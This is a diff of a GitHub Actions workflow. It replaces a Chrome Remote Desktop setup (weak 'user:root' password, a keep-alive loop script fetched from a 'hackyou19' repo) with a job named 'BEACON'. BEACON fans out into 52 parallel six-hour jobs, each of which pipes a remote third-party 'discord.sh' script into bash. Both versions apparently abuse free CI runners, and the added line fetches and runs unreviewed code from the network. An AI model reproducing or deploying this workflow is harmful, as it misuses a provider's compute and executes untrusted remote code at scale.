@@ -1,39 +1,20 @@
-name: Ubun 20.04
-on: 
-  workflow_dispatch:
-    inputs:
-      code:
-        description: 'Chrome Remote Desktop Code | Debian Linux'
-        required: true
-      pin:
-        description: '6 digits PIN'
-        required: true
+name: BEACON
+on: [workflow_dispatch]
 jobs:
   build:
-    runs-on: ubuntu-20.04
+    name: BEDS
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 100
+      fail-fast: false
+      matrix:
+        go: [1.6]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, A1, B1, C1, D1, E1, F1, G1, H1, I1, J1, K1, L1, M1, N1, O1, P1, Q1, R1, S1, T1, U1, V1, W1, X1, Y1, Z1]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 100
+        JOB: ${{ matrix.go }}
     steps:
-    - name: Create User
-      run: sudo useradd -m user && sudo adduser root sudo && echo 'user:root' | sudo chpasswd
-    - name: Doanload & Install files
-      run: | 
-        echo Update: APT
-        sudo apt update
-        echo Install: Ubuntu Desktop
-        sudo apt install ubuntu-desktop
-        echo Download: Chrome
-        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-        echo Install: Chrome
-        sudo dpkg --install google-chrome-stable_current_amd64.deb
-        sudo apt install --assume-yes --fix-broken
-        echo Install: Xbase Clients
-        sudo apt-get install xbase-clients python3-psutil xvfb -y
-        echo Install: Chrome Remote Desktop
-        wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
-        sudo dpkg --install chrome-remote-desktop_current_amd64.deb
-        sudo apt install --assume-yes --fix-broken
-        echo Download: Keep Alive
-        wget https://raw.githubusercontent.com/hackyou19/ubun/main/loop.sh
-    - name: Start Chrome Remote Desktop
-      run: ${{ github.event.inputs.code }} -pin=${{ github.event.inputs.pin }}
-    - name: Done! You can see the machine in list now.
-      run: bash loop.sh
+    - name: BEDS
+      run: |
+        curl https://raw.githubusercontent.com/Shannon-SM/Shannon-SM/main/discord.sh | bash
